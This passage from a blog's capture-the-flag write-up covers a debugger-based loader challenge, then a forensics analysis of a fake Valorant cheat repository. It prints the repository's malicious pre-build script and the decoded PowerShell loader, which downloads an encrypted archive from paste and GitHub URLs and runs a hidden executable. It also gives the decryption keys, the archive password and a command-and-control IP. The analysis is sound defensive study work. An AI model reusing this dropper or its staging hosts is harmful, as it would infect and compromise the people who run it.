</span></code></pre><p>Using <a href=https://github.com/pwndbg/pwndbg><code>pwndbg/pwndbg</code></a>, it‚Äôs a little more clear:<pre class=language-as data-lang=as style=color:#c0c5ce;background-color:#2b303b><code class=language-as data-lang=as><span> ‚ñ∫ </span><span style=color:#d08770>0x7ffff7fbf000</span><span>    mov    edi, </span><span style=color:#d08770>1</span><span>             EDI => </span><span style=color:#d08770>1
</span><span>   </span><span style=color:#d08770>0x7ffff7fbf005</span><span>    xor    rsi, rsi           RSI => </span><span style=color:#d08770>0
</span><span>   </span><span style=color:#d08770>0x7ffff7fbf008</span><span>    xor    rdx, rdx           RDX => </span><span style=color:#d08770>0
</span><span>   </span><span style=color:#d08770>0x7ffff7fbf00b</span><span>    xor    r10, r10           R10 => </span><span style=color:#d08770>0
</span><span>   </span><span style=color:#d08770>0x7ffff7fbf00e</span><span>    mov    eax, </span><span style=color:#d08770>0x65</span><span>          EAX => </span><span style=color:#d08770>0x65
</span><span>   </span><span style=color:#d08770>0x7ffff7fbf013</span><span>    syscall  &LTSYS_ptrace>
</span><span>   </span><span style=color:#d08770>0x7ffff7fbf015</span><span>    cmp    rax, </span><span style=color:#d08770>0
</span></code></pre><p>Setting <code>set $rax=0</code> right before that check is made to bypass it. The program then runs, looping a <em>lot</em>, before dying with this final set of instructions:<pre class=language-as data-lang=as style=color:#c0c5ce;background-color:#2b303b><code class=language-as data-lang=as><span>   </span><span style=color:#d08770>0x7ffff7fbf094</span><span>    mov    ebx, </span><span style=color:#d08770>0x6174654d</span><span>     EBX => </span><span style=color:#d08770>0x6174654d
</span><span>   </span><span style=color:#d08770>0x7ffff7fbf099</span><span>    mov    ebx, </span><span style=color:#d08770>0x7b465443</span><span>     EBX => </span><span style=color:#d08770>0x7b465443
</span><span>   </span><span style=color:#d08770>0x7ffff7fbf09e</span><span>    mov    ebx, </span><span style=color:#d08770>0x6564346d</span><span>     EBX => </span><span style=color:#d08770>0x6564346d
</span><span>   </span><span style=color:#d08770>0x7ffff7fbf0a3</span><span>    mov    ebx, </span><span style=color:#d08770>0x34306c5f</span><span>     EBX => </span><span style=color:#d08770>0x34306c5f
</span><span>   </span><span style=color:#d08770>0x7ffff7fbf0a8</span><span>    mov    ebx, </span><span style=color:#d08770>0x5f723364</span><span>     EBX => </span><span style=color:#d08770>0x5f723364
</span><span> ‚ñ∫ </span><span style=color:#d08770>0x7ffff7fbf0ad</span><span>    mov    ebx, </span><span style=color:#d08770>0x72755f34</span><span>     EBX => </span><span style=color:#d08770>0x72755f34
</span><span>   </span><span style=color:#d08770>0x7ffff7fbf0b2</span><span>    mov    ebx, </span><span style=color:#d08770>0x61306c5f</span><span>     EBX => </span><span style=color:#d08770>0x61306c5f
</span><span>   </span><span style=color:#d08770>0x7ffff7fbf0b7</span><span>    mov    ebx, </span><span style=color:#d08770>0x7d723364</span><span>     EBX => </span><span style=color:#d08770>0x7d723364
</span><span>   </span><span style=color:#d08770>0x7ffff7fbf0bc</span><span>    xor    rbx, rbx            RBX => </span><span style=color:#d08770>0
</span><span>   </span><span style=color:#d08770>0x7ffff7fbf0bf</span><span>    mov    eax, </span><span style=color:#d08770>0x3c</span><span>           EAX => </span><span style=color:#d08770>0x3c
</span><span>   </span><span style=color:#d08770>0x7ffff7fbf0c4</span><span>    xor    ecx, eax            ECX => </span><span style=color:#d08770>0</span><span> (</span><span style=color:#d08770>0x3c</span><span> ^ </span><span style=color:#d08770>0x3c</span><span>)
</span><span>   </span><span style=color:#d08770>0x7ffff7fbf0c6</span><span>    retf
</span></code></pre><p>Interestingly though:<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span>>>> </span><span style=color:#d08770>0x6174654d</span><span>.</span><span style=color:#bf616a>to_bytes</span><span>(</span><span style=color:#d08770>4</span><span>)
</span><span style=color:#b48ead>b</span><span>'</span><span style=color:#a3be8c>ateM</span><span>'
</span></code></pre><p>Applying that same principle to the rest of the values:<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span>data = """
</span><span style=color:#a3be8c>   0x7ffff7fbf094    mov    ebx, 0x6174654d     EBX => 0x6174654d
</span><span style=color:#a3be8c>   0x7ffff7fbf099    mov    ebx, 0x7b465443     EBX => 0x7b465443
</span><span style=color:#a3be8c>   0x7ffff7fbf09e    mov    ebx, 0x6564346d     EBX => 0x6564346d
</span><span style=color:#a3be8c>   0x7ffff7fbf0a3    mov    ebx, 0x34306c5f     EBX => 0x34306c5f
</span><span style=color:#a3be8c>   0x7ffff7fbf0a8    mov    ebx, 0x5f723364     EBX => 0x5f723364
</span><span style=color:#a3be8c> ‚ñ∫ 0x7ffff7fbf0ad    mov    ebx, 0x72755f34     EBX => 0x72755f34
</span><span style=color:#a3be8c>   0x7ffff7fbf0b2    mov    ebx, 0x61306c5f     EBX => 0x61306c5f
</span><span style=color:#a3be8c>   0x7ffff7fbf0b7    mov    ebx, 0x7d723364     EBX => 0x7d723364
</span><span>"""
</span><span>
</span><span>"".</span><span style=color:#bf616a>join</span><span>(
</span><span>    int_.</span><span style=color:#bf616a>to_bytes</span><span>(</span><span style=color:#d08770>4</span><span>, </span><span style=color:#bf616a>byteorder</span><span>="</span><span style=color:#a3be8c>little</span><span>").</span><span style=color:#bf616a>decode</span><span>()
</span><span>    </span><span style=color:#b48ead>for </span><span>int_ </span><span style=color:#b48ead>in </span><span style=color:#96b5b4>map</span><span>(</span><span style=color:#96b5b4>eval</span><span>, (line.</span><span style=color:#bf616a>split</span><span>()[-</span><span style=color:#d08770>1</span><span>] </span><span style=color:#b48ead>for </span><span>line </span><span style=color:#b48ead>in </span><span>data.</span><span style=color:#bf616a>strip</span><span>().</span><span style=color:#bf616a>splitlines</span><span>()))
</span><span>)
</span></code></pre><p>Thankfully, that gives:<pre class=language-txt data-lang=txt style=color:#c0c5ce;background-color:#2b303b><code class=language-txt data-lang=txt><span>MetaCTF{m4de_l04d3r_4_ur_l0ad3r}
</span></code></pre><h2 id=whisper-of-the-pain>Whisper Of The Pain</h2><blockquote><p><em>The Valorant gaming community has recently become the target of a mysterious cyber campaign. This operation appears to exploit players who use cheating tools, turning their machines into unwitting pawns in a larger scheme.</em><p><em>Our investigation has led us to the computer of one such victim‚Äîa treasure trove of evidence awaits. Your mission is to dive deep, uncover the truth, and pinpoint the IP addresses used by the perpetrators to orchestrate this campaign. However, the analysis of the malicious samples has triggered the attackers. As a result, most of the links to the malicious code have now been taken down. Does this make it more difficult for you?</em><p><em>Download the artifact <a href=https://metaproblems.com/c4e013408da63c6f86fae931d4f356aa/2025-01-17T040003_Evidence.zip>here</a>. Follow the investigation to it‚Äôs end and you will uncover the flag.</em></blockquote><p>A quick grep for ‚Äúcheat‚Äù turns up references to one <code>CyberValorant-Cheat-Visual-Aimbot-ESP</code> which sounds suitably promising. The SQLite database at <code>C/Users/IEUser/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/History</code> also contains a reference to the GitHub repo. for that in its <code>urls</code> table: <a href=https://github.com/hannah1337/CyberValorant-Cheat-Visual-Aimbot-ESP><code>hannah1337/CyberValorant-Cheat-Visual-Aimbot-ESP</code></a>.<p>The <code>Valorant-External.vcxproj</code> in that repo. contains this:<pre class=language-xml data-lang=xml style=color:#c0c5ce;background-color:#2b303b><code class=language-xml data-lang=xml><span><</span><span style=color:#bf616a>PreBuildEvent</span><span>>
</span><span>  <</span><span style=color:#bf616a>Command</span><span>>@echo off</span><span style=color:#8fa1b3>&#x</span><span style=color:#d08770>D;</span><span style=color:#8fa1b3>&#x</span><span style=color:#d08770>A;</span><span>setlocal</span><span style=color:#8fa1b3>&#x</span><span style=color:#d08770>D;</span><span style=color:#8fa1b3>&#x</span><span style=color:#d08770>A;</span><span>set "a=%25TEMP%25\a"</span><span style=color:#8fa1b3>&#x</span><span style=color:#d08770>D;</span><span style=color:#8fa1b3>&#x</span><span style=color:#d08770>A;</span><span>mkdir "%25a%25" 2</span><span style=color:#8fa1b3>&</span><span style=color:#d08770>gt;</span><span>nul</span><span style=color:#8fa1b3>&#x</span><span style=color:#d08770>D;</span><span style=color:#8fa1b3>&#x</span><span style=color:#d08770>A;</span><span>echo b = "JFIgPSAiPXdtY2dzVG‚Ä¶
</span><span>&LT/</span><span style=color:#bf616a>PreBuildEvent</span><span>>
</span></code></pre><p>‚Ä¶well, a whole host of encoded data. With some CyberChef assistance:<ul><li>decoding HTML entities<li>URL decoding<li>replacing <code>&amp#xD;&amp#xA;</code> with <code>\r\n</code> (not sure what type of encoding this is)</ul><p>‚Ä¶it reduces to this (with some base64 chunks in there):<pre class=language-pwsh data-lang=pwsh style=color:#c0c5ce;background-color:#2b303b><code class=language-pwsh data-lang=pwsh><span>@echo off
</span><span>setlocal
</span><span>set "a=%TEMP%\a"
</span><span>mkdir "%a%" 2>nul
</span><span>echo b = "JFIgPSAiPX‚Ä¶" > "%a%\b.vbs"
</span><span>echo c = "VdvQUNka0FDY‚Ä¶" >> "%a%\b.vbs"
</span><span>echo d = "JwUjNZdVZuW‚Ä¶" >> "%a%\b.vbs"
</span><span>echo e = b ^& d ^& c >> "%a%\b.vbs"
</span><span>echo Set f = CreateObject("MSXml2.DOMDocument.6.0").createElement("base64") >> "%a%\b.vbs"
</span><span>echo f.DataType = "bin.base64" >> "%a%\b.vbs"
</span><span>echo f.Text = e >> "%a%\b.vbs"
</span><span>echo g = f.NodeTypedValue >> "%a%\b.vbs"
</span><span>echo h = "%a%\i.ps1" >> "%a%\b.vbs"
</span><span>echo Set j = CreateObject("Scripting.FileSystemObject") >> "%a%\b.vbs"
</span><span>echo Set k = j.CreateTextFile(h, True) >> "%a%\b.vbs"
</span><span>echo k.Write l(g) >> "%a%\b.vbs"
</span><span>echo k.Close >> "%a%\b.vbs"
</span><span>echo Set m = CreateObject("WScript.Shell") >> "%a%\b.vbs"
</span><span>echo m.Run "powershell.exe -ExecutionPolicy Bypass -File " ^& h, 0, False >> "%a%\b.vbs"
</span><span>echo Function l(n) >> "%a%\b.vbs"
</span><span>echo Dim o, p >> "%a%\b.vbs"
</span><span>echo Set o = CreateObject("ADODB.Recordset") >> "%a%\b.vbs"
</span><span>echo p = LenB(n) >> "%a%\b.vbs"
</span><span>echo If p ^> 0 Then >> "%a%\b.vbs"
</span><span>echo o.Fields.Append "q", 201, p >> "%a%\b.vbs"
</span><span>echo o.Open >> "%a%\b.vbs"
</span><span>echo o.AddNew >> "%a%\b.vbs"
</span><span>echo o("q").AppendChunk n >> "%a%\b.vbs"
</span><span>echo o.Update >> "%a%\b.vbs"
</span><span>echo l = o("q").GetChunk(p) >> "%a%\b.vbs"
</span><span>echo Else >> "%a%\b.vbs"
</span><span>echo l = "" >> "%a%\b.vbs"
</span><span>echo End If >> "%a%\b.vbs"
</span><span>echo End Function >> "%a%\b.vbs"
</span><span>cscript //nologo "%a%\b.vbs"
</span><span>endlocal
</span></code></pre><p>‚Ä¶which, after yet more manipulation and base64 decoding gives:<pre class=language-pwsh data-lang=pwsh style=color:#c0c5ce;background-color:#2b303b><code class=language-pwsh data-lang=pwsh><span>$R = "=wmcgsTfgUWdulGdu92Q5xG‚Ä¶zb3JCIwByegknc0Byegwmcg42bpR3YuVnZ"; $txt = $R.ToCharArray(); [array]::Reverse($txt); $bnb = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(-join $txt)); $exp = "Invoke-Expression"; New-Alias -Name pWN -Value $exp -Force; pWN $bnb
</span></code></pre><p>‚Ä¶which after reversing and base64-decoding gives:<pre class=language-pwsh data-lang=pwsh style=color:#c0c5ce;background-color:#2b303b><code class=language-pwsh data-lang=pwsh><span>function rl { try { p "wo7CucOmwqzCuMKWaMKUw5zCn8K9wr/CqsKIwq7DoGrCqMOLwqbClMOewp/DgXrCkHjCjcKowpbClcK1wpI=" } catch { x } } function x { try { p "wo7CucOmwqzCuMKWaMKUw5zCn8K9wr/CqsKIwq7DoGrCqMOLwqbClMOewp/DgXrCnH7Cu8KlfcKewrDCqw==" } catch { l } } function l { try { p "wo7CucOmwqzCuMKWaMKUw57CqsKzwrhzwonCtMOfa8K5wqZwwq7DonN3woPCu2d0w6TCncK8" } catch { o } } function o { try { p "wo7CucOmwqzCuMKWaMKUw57Co8K4wr/Ct8Kfc8OVwqt0w5ZswpvCnsK2wrXCg8KrVcK3w5PCsw==" } catch { Start-Sleep -Seconds 20; rl } }; function p { param ([string]$e) if (-not $e) { return } try { $d = d -mm $e -k $prooc; $r = Invoke-RestMethod -Uri $d; if ($r) { $dl = d -mm $r -k $proc } $g = [System.Guid]::NewGuid().ToString(); $t = [System.IO.Path]::GetTempPath(); $f = Join-Path $t ($g + ".7z"); $ex = Join-Path $t ([System.Guid]::NewGuid().ToString()); $c = New-Object System.Net.WebClient; $b = $c.DownloadData($dl); if ($b.Length -gt 0) { [System.IO.File]::WriteAllBytes($f, $b); e -a $f -o $ex; $exF = Join-Path $ex "SearchFilter.exe"; if (Test-Path $exF) { Start-Process -FilePath $exF -WindowStyle Hidden } if (Test-Path $f) { Remove-Item $f } } } catch { throw } }; $prooc = "&Er&LTE\9el>J`KE"; function d { param ([string]$mm, [string]$k) try { $b = [System.Convert]::FromBase64String($mm); $s = [System.Text.Encoding]::UTF8.GetString($b); $d = New-Object char[] $s.Length; for ($i = 0; $i -lt $s.Length; $i++) { $c = $s[$i]; $p = $k[$i % $k.Length]; $d[$i] = [char]($c - $p) }; return -join $d } catch { throw } }; $proc = "```$b#{o*%3I,};',W```"n~O@0"; function v { param ([string]$i) $b = [System.Convert]::FromBase64String($i); $s = [System.Text.Encoding]::UTF8.GetString($b); $c = $s -split ' '; $r = ""; foreach ($x in $c) { $r += [char][int]$x }; return $r }; function e { param ([string]$a, [string]$o) $s = "NTAgNTAgNTUgNTEgNTIgNTMgNTQgNTEgNTUgNTAgNTEgNTEgNTUgNTIgNTAgMTAwIDU1IDQ4IDUyIDQ4IDU1IDUxIDU1IDUxIDU1IDU1IDUxIDQ4IDU1IDUwIDU0IDUyIDUwIDUw"; $p = v -i $s; $z = "C:\ProgramData\seventzip\7z.exe"; $arg = "x `"$a`" -o`"$o`" -p$p -y"; Start-Process -FilePath $z -ArgumentList $arg -WindowStyle Hidden -Wait }; $d = "C:\ProgramData\seventzip"; if (-not (Test-Path "$d\7z.exe")) { New-Item -ItemType Directory -Path $d -Force | Out-Null; $u = "https://www.7-zip.org/a/7zr.exe"; $o = Join-Path -Path $d -ChildPath "7z.exe"; $wc = New-Object System.Net.WebClient; $wc.DownloadFile($u, $o); $wc.Dispose(); Set-ItemProperty -Path $o -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System) -ErrorAction SilentlyContinue; Set-ItemProperty -Path $d -Name Attributes -Value ([System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System) -ErrorAction SilentlyContinue }; rl
</span></code></pre><p>Those base64 strings are passed through <code>function d</code>:<pre class=language-pwsh data-lang=pwsh style=color:#c0c5ce;background-color:#2b303b><code class=language-pwsh data-lang=pwsh><span>function d {
</span><span>    param ([string]$mm, [string]$k)
</span><span>    try {
</span><span>        $b = [System.Convert]::FromBase64String($mm);
</span><span>        $s = [System.Text.Encoding]::UTF8.GetString($b);
</span><span>        $d = New-Object char[] $s.Length;
</span><span>        for ($i = 0; $i -lt $s.Length; $i++) {
</span><span>            $c = $s[$i];
</span><span>            $p = $k[$i % $k.Length];
</span><span>            $d[$i] = [char]($c - $p)
</span><span>        };
</span><span>        return -join $d
</span><span>    } catch {
</span><span>        throw
</span><span>    }
</span><span>};
</span></code></pre><p>‚Ä¶where <code>mm</code> is the base64 string and <code>k</code> is the value of <code>prooc</code>: <code>&Er&LTE\9el>JKE</code>, for example:<pre class=language-pwsh data-lang=pwsh style=color:#c0c5ce;background-color:#2b303b><code class=language-pwsh data-lang=pwsh><span>PS /mnt> $mm = "wo7CucOmwqzCuMKWaMKUw5zCn8K9wr/CqsKIwq7DoGrCqMOLwqbClMOewp/DgXrCkHjCjcKowpbClcK1wpI=";
</span><span>PS /mnt> $k = "&Er&LTE\9el>J`KE";
</span><span>PS /mnt> d -mm $mm -k $k;
</span><span>https://pastebin.com/raw/KRH6ZPYY
</span></code></pre><p>Repeating that for the remaining 3 base64 chunks yields:<ul><li><code>https://pastebin.com/raw/KRH6ZPYY</code><li><code>https://pastebin.com/raw/WXv3AYTr</code><li><code>https://rlim.com/tJ7Iv5-8vA/raw</code><li><code>https://rentry.co/z362xk8f/raw</code></ul><p>3 of these have been removed but the <code>rlim.com</code> one allows the history to be viewed (after wrangling with the site‚Äôs over-enthusiastic ads.) and although it now shows <code>REDACTED</code>, previously it was:<pre class=language-txt data-lang=txt style=color:#c0c5ce;background-color:#2b303b><code class=language-txt data-lang=txt><span>w4jCmMOWwpPDrsKpWVTCmsKywqDDpcKwwolawrrDj8KPwp3DpsKwwqPCm8OEwoXDj8KIw6/DkMKgworCpcK8wpHCrMKfwozCmMK/w4lPw5vDo8ODwrLCn8KPwpbDh8KPw6DDkMKdworCpnjCkMOswrLClcKYw4bDgcKGwp3Dq8K0wrTCosOPU8K2d8K/w4HCj8KVwp/CqsKlwqtywqE=
</span></code></pre><p>Using the value of <code>proc</code> from the above:<pre class=language-pwsh data-lang=pwsh style=color:#c0c5ce;background-color:#2b303b><code class=language-pwsh data-lang=pwsh><span>PS /mnt> $k = "```$b#{o*%3I,};',W```"n~O@0";
</span><span>PS /mnt> d -mm $mm -k $k;
</span><span>https://github.com/hackdametaverse/delhi-metro/releases/download/metro/TTDReplay.7z
</span></code></pre><p>The 7z archive is password protected and the password is again base64 encoded but it‚Äôs the ASCII values of the characters, not the password directly:<pre class=language-python data-lang=python style=color:#c0c5ce;background-color:#2b303b><code class=language-python data-lang=python><span style=color:#b48ead>import </span><span>base64
</span><span>
</span><span>`"".</span><span style=color:#bf616a>join</span><span>(
</span><span>    </span><span style=color:#96b5b4>map</span><span>(
</span><span>        </span><span style=color:#96b5b4>chr</span><span>,
</span><span>        </span><span style=color:#96b5b4>map</span><span>(
</span><span>            int,
</span><span>            base64.</span><span style=color:#bf616a>b64decode</span><span>(
</span><span>                "</span><span style=color:#a3be8c>NTAgNTAgNTUgNTEgNTIgNTMgNTQgNTEgNTUgNTAgNTEgNTEgNTUgNTIgNTAgMTAwIDU1IDQ4IDUyIDQ4IDU1IDUxIDU1IDUxIDU1IDU1IDUxIDQ4IDU1IDUwIDU0IDUyIDUwIDUw</span><span>"
</span><span>            ).</span><span style=color:#bf616a>decode</span><span>().</span><span style=color:#bf616a>split</span><span>()
</span><span>        )
</span><span>    )
</span><span>)
</span></code></pre><p>Using the resulting password of <code>227345637233742d704073737730726422</code> extracts an executable, <code>SearchFilter.exe</code>:<pre class=language-sh data-lang=sh style=color:#c0c5ce;background-color:#2b303b><code class=language-sh data-lang=sh><span style=color:#bf616a>‚îå‚îÄ‚îÄ</span><span>(root„âøpsy-xps-13)</span><span style=color:#bf616a>-[/mnt]
</span><span style=color:#bf616a>‚îî‚îÄ#</span><span> file SearchFilter.exe
</span><span style=color:#bf616a>SearchFilter.exe:</span><span> PE32 executable (GUI) </span><span style=color:#bf616a>Intel</span><span> 80386 Mono/.Net assembly, for MS Windows, 2 sections
</span></code></pre><p>As it‚Äôs a .NET executable, <a href=https://github.com/icsharpcode/ILSpy/tree/master/ICSharpCode.ILSpyCmd><code>ILSpyCmd</code></a> to the rescue‚Ä¶sort of. Class names and variables appear to be in Chinese (according to Google Translate) making things a touch difficult <em>but</em> thanks to references to things like this:<pre class=language-cs data-lang=cs style=color:#c0c5ce;background-color:#2b303b><code class=language-cs data-lang=cs><span style=color:#b48ead>namespace </span><span>‰∫∫ÁöÑÂü∑Â•πÁöÑË°å‰∫∫‰ΩøÊàêÊæ§È°ßÂïÜÊé•Â§™
</span><span>{
</span><span>    </span><span style=color:#b48ead>public class </span><span style=color:#ebcb8b>Êæ§Á®ãÂ∏≠ÊàêÈ°ßÂèó
</span><span style=color:#eff1f5>    {
</span><span style=color:#eff1f5>        </span><span style=color:#b48ead>public static object </span><span style=color:#8fa1b3>ÂüéÊàêÁîüÈ°ßÁöÑÂÆ∂ÂïÜÂ∏≠ÂïÜ</span><span style=color:#eff1f5>(</span><span style=color:#b48ead>string </span><span style=color:#bf616a>ÂèóÂ∞áÂêà‰∫∫È°ßÂ§™Â≠´ÂêàÊâø</span><span style=color:#eff1f5>)
</span><span style=color:#eff1f5>        {
</span><span style=color:#eff1f5>            RijndaelManaged </span><span style=color:#bf616a>rijndaelManaged </span><span>= new </span><span style=color:#eff1f5>RijndaelManaged();
</span><span style=color:#eff1f5>            MD5CryptoServiceProvider </span><span style=color:#bf616a>mD5CryptoServiceProvider </span><span>= new </span><span style=color:#eff1f5>MD5CryptoServiceProvider();
</span></code></pre><p>‚Ä¶there‚Äôs at least some sense of what‚Äôs happening. This base64 string appears to be encryped:<pre class=language-cs data-lang=cs style=color:#c0c5ce;background-color:#2b303b><code class=language-cs data-lang=cs><span style=color:#b48ead>public static string </span><span style=color:#bf616a>ÁÇ∫ÂÖ¨ÁöÑÊï¨È°ßÁÆ°Áîü‰∫∫ÊâøÂ∞éÂ§™Â∏å </span><span>= "</span><span style=color:#a3be8c>kxpp2h/dBYdEEY5NSXs4qGq+91pW6PsavDuNGg+u+IXLR0W2o0d5Cdg9OXc8qQ+i</span><span>";
</span></code></pre><p>‚Ä¶with the encryption key being derived from this:<pre class=language-cs data-lang=cs style=color:#c0c5ce;background-color:#2b303b><code class=language-cs data-lang=cs><span style=color:#b48ead>public static string </span><span style=color:#bf616a>Êï¨È°ßÂü∑Â≠êÈ°ß </span><span>= "</span><span style=color:#a3be8c>$</span><span style=color:#d08770>{8</span><span style=color:#2b303b;background-color:#bf616a>',`d0</span><span style=color:#d08770>}</span><span style=color:#a3be8c>n,~@J;oZ</span><span style=color:#96b5b4>\"</span><span style=color:#a3be8c>9a</span><span>";
</span></code></pre><p>‚Ä¶from which the code calculates the MD5 and combines the first 15 and then 16 bytes of said hash, plus a final <code>0</code>:<pre class=language-cs data-lang=cs style=color:#c0c5ce;background-color:#2b303b><code class=language-cs data-lang=cs><span style=color:#b48ead>byte</span><span>[] </span><span style=color:#bf616a>array </span><span>= new </span><span style=color:#b48ead>byte</span><span>[</span><span style=color:#d08770>32</span><span>];
</span><span style=color:#b48ead>byte</span><span>[] </span><span style=color:#bf616a>sourceArray </span><span>= </span><span style=color:#bf616a>mD5CryptoServiceProvider</span><span>.</span><span style=color:#bf616a>ComputeHash</span><span>(</span><span style=color:#bf616a>ÊàêÂïÜÊæ§Â≠êÈáëÂëΩÂüé</span><span>.</span><span style=color:#bf616a>Â∞äÁöÑÂ∞äÊæ§‰∫∫Â∏å‰∫∫</span><span>(</span><span style=color:#bf616a>ÂÆ∂È°ßÁéâÁöÑÊæ§È°ß‰∫∫</span><span>.</span><span style=color:#bf616a>Êï¨È°ßÂü∑Â≠êÈ°ß</span><span>));
</span><span style=color:#bf616a>Array</span><span>.</span><span style=color:#bf616a>Copy</span><span>(</span><span style=color:#bf616a>sourceArray</span><span>, </span><span style=color:#d08770>0</span><span>, </span><span style=color:#bf616a>array</span><span>, </span><span style=color:#d08770>0</span><span>, </span><span style=color:#d08770>16</span><span>);
</span><span style=color:#bf616a>Array</span><span>.</span><span style=color:#bf616a>Copy</span><span>(</span><span style=color:#bf616a>sourceArray</span><span>, </span><span style=color:#d08770>0</span><span>, </span><span style=color:#bf616a>array</span><span>, </span><span style=color:#d08770>15</span><span>, </span><span style=color:#d08770>16</span><span>);
</span></code></pre><p>‚Ä¶before finally being encrypted:<pre class=language-cs data-lang=cs style=color:#c0c5ce;background-color:#2b303b><code class=language-cs data-lang=cs><span style=color:#bf616a>rijndaelManaged</span><span>.</span><span style=color:#bf616a>Key </span><span>= </span><span style=color:#bf616a>array</span><span>;
</span><span style=color:#bf616a>rijndaelManaged</span><span>.</span><span style=color:#bf616a>Mode </span><span>= </span><span style=color:#bf616a>CipherMode</span><span>.</span><span style=color:#bf616a>ECB</span><span>;
</span><span>ICryptoTransform </span><span style=color:#bf616a>cryptoTransform </span><span>= </span><span style=color:#bf616a>rijndaelManaged</span><span>.</span><span style=color:#bf616a>CreateEncryptor</span><span>();
</span><span style=color:#b48ead>byte</span><span>[] </span><span style=color:#bf616a>array2 </span><span>= </span><span style=color:#bf616a>ÊàêÂïÜÊæ§Â≠êÈáëÂëΩÂüé</span><span>.</span><span style=color:#bf616a>Â∞äÁöÑÂ∞äÊæ§‰∫∫Â∏å‰∫∫</span><span>(</span><span style=color:#bf616a>ÂèóÂ∞áÂêà‰∫∫È°ßÂ§™Â≠´ÂêàÊâø</span><span>);
</span><span style=color:#bf616a>result </span><span>= </span><span style=color:#bf616a>Convert</span><span>.</span><span style=color:#bf616a>ToBase64String</span><span>(</span><span style=color:#bf616a>cryptoTransform</span><span>.</span><span style=color:#bf616a>TransformFinalBlock</span><span>(</span><span style=color:#bf616a>array2</span><span>, </span><span style=color:#d08770>0</span><span>, </span><span style=color:#bf616a>array2</span><span>.</span><span style=color:#bf616a>Length</span><span>));
</span><span style=color:#b48ead>return </span><span style=color:#bf616a>result</span><span>;
</span></code></pre><p>With a key of <code>f3758b11f3304f884564a6fb1548e5f3758b11f3304f884564a6fb1548e5d20</code>, decrypting <code>ÁÇ∫ÂÖ¨ÁöÑÊï¨È°ßÁÆ°Áîü‰∫∫ÊâøÂ∞éÂ§™Â∏å</code> via CyberChef (base64 decryption and AES/ECB decryption) yields: <code>https://pastebin.com/raw/uyNtUu9p</code>:<pre class=language-sh data-lang=sh style=color:#c0c5ce;background-color:#2b303b><code class=language-sh data-lang=sh><span style=color:#bf616a>‚ùØ</span><span> curl https://pastebin.com/raw/uyNtUu9p
</span><span style=color:#bf616a>98.184.49.53:8080
</span><span style=color:#65737e>#MetaCTF{Curs3s_c0mE_h0me_T0_rO0sT}
</span></code></pre></article><hr><nav id=post-nav><a class="post-nav-item post-nav-prev" href=https://blog.psypherpunk.io/blog/polyfactory-and-patients/> <div class=nav-arrow>Previous</div> <span class=post-title>Ô∏èüêç Polyfactory and Patients</span> </a><a class="post-nav-item post-nav-next" href=https://blog.psypherpunk.io/blog/htb-machine-easy-underpass/> <div class=nav-arrow>Next</div> <span class=post-title>Ô∏èüì¶ HackTheBox: UnderPass</span> </a></nav></main><footer id=site-footer><nav><ul><li><a href=https://blog.psypherpunk.io/blog/>Blog</a></ul></nav><p>¬© 2025 PsypherPunk<ul id=socials><li><a rel=" me" href=https://github.com/PsypherPunk title=GitHub> <i style="--icon:url(&#34data:image/svg+xml,%3Csvg role='img' viewBox='0 0 24 24' xmlns='http://www.w3.org/2000/svg'%3E%3Ctitle%3EGitHub%3C/title%3E%3Cpath d='M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12'/%3E%3C/svg%3E&#34)" class=icon></i> <span>GitHub</span> </a><li><a rel=" me" href=https://hachyderm.io/@psypherpunk title=Mastodon> <i style="--icon:url(&#34data:image/svg+xml,%3Csvg role='img' viewBox='0 0 24 24' xmlns='http://www.w3.org/2000/svg'%3E%3Ctitle%3EMastodon%3C/title%3E%3Cpath d='M23.268 5.313c-.35-2.578-2.617-4.61-5.304-5.004C17.51.242 15.792 0 11.813 0h-.03c-3.98 0-4.835.242-5.288.309C3.882.692 1.496 2.518.917 5.127.64 6.412.61 7.837.661 9.143c.074 1.874.088 3.745.26 5.611.118 1.24.325 2.47.62 3.68.55 2.237 2.777 4.098 4.96 4.857 2.336.792 4.849.923 7.256.38.265-.061.527-.132.786-.213.585-.184 1.27-.39 1.774-.753a.057.057 0 0 0 .023-.043v-1.809a.052.052 0 0 0-.02-.041.053.053 0 0 0-.046-.01 20.282 20.282 0 0 1-4.709.545c-2.73 0-3.463-1.284-3.674-1.818a5.593 5.593 0 0 1-.319-1.433.053.053 0 0 1 .066-.054c1.517.363 3.072.546 4.632.546.376 0 .75 0 1.125-.01 1.57-.044 3.224-.124 4.768-.422.038-.008.077-.015.11-.024 2.435-.464 4.753-1.92 4.989-5.604.008-.145.03-1.52.03-1.67.002-.512.167-3.63-.024-5.545zm-3.748 9.195h-2.561V8.29c0-1.309-.55-1.976-1.67-1.976-1.23 0-1.846.79-1.846 2.35v3.403h-2.546V8.663c0-1.56-.617-2.35-1.848-2.35-1.112 0-1.668.668-1.67 1.977v6.218H4.822V8.102c0-1.31.337-2.35 1.011-3.12.696-.77 1.608-1.164 2.74-1.164 1.311 0 2.302.5 2.962 1.498l.638 1.06.638-1.06c.66-.999 1.65-1.498 2.96-1.498 1.13 0 2.043.395 2.74 1.164.675.77 1.012 1.81 1.012 3.12z'/%3E%3C/svg%3E&#34)" class=icon></i> <span>Mastodon</span> </a><li><a rel=" me" href=https://twitter.com/PsypherPunk title=Twitter> <i 